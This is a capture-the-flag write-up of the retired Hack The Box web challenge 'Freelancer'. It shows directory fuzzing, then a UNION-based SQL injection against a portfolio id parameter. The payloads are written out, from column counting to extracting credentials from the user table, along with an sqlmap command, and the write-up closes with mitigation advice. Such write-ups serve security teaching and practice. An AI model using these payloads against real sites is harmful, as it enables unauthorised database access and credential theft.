---
challenge: Freelancer
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, sqli, union, mysql, admin-panel]
---

# Freelancer — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Solved challenge; no real flags.

## TL;DR

The entry point is **not the login form**: it is `portfolio.php?id=1`, a `GET` parameter concatenated into the query (MySQL). A **three-column** `UNION` dumps the schema and yields the administrator credential; the `/admin` panel shows up during directory fuzzing, and that is the way to the flag.

## Brief

A Docker instance of a freelancer site: landing page, portfolios by `id` and a login form. No source code, so this is black-box testing.

## Recon

```bash
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
# portfolio.php, /admin
curl -s "http://<IP>/portfolio.php?id=1"
```

## The flaw

A quote in `id` breaks the query (`id=1'` returns an empty portfolio or loses the lorem text): classic injection in a `SELECT` with **three columns**.

```text
id=1' ORDER BY 3-- -
id=1' UNION SELECT 1,2,3-- -
id=-1' UNION SELECT 1,version(),database()-- -
```

```text
5.7.x | <database>
```

## Exploitation

Enumerate the schema and pull the user table:

```text
id=-1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
id=-1' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='<table>'-- -
id=-1' UNION SELECT 1,concat(username,0x3a,password),3 FROM <table>-- -
```

The challenge is old and the password is stored in clear text or with a trivial hash, so the recovered value logs into `/admin`. Automated:

```bash
sqlmap -u "http://<IP>/portfolio.php?id=1" --batch --dbs --privileges
```

Public writeups disagree on the last step: some read the flag straight from the database dump, others collect it from `/admin` after logging in. Both routes start from the same `UNION`.

## Evidence

- Trimmed output of the key commands; no flags, credentials or tokens.
- Real values live in `private/` and are not published.

## Lessonslearned

- **Read the HTML before the login form**: the `href="portfolio.php?id=1"` saves half an hour.
- **Columns first**: `ORDER BY`, then `UNION SELECT 1,2,3`.
- **`-1` in the `id`**: without it the legitimate row hides the injection result.

- A numeric `GET` parameter is suspect number one in any web challenge.
- `UNION` turns any reflected column into an extraction channel.
- Mitigation: prepared statements and a least-privilege database account.
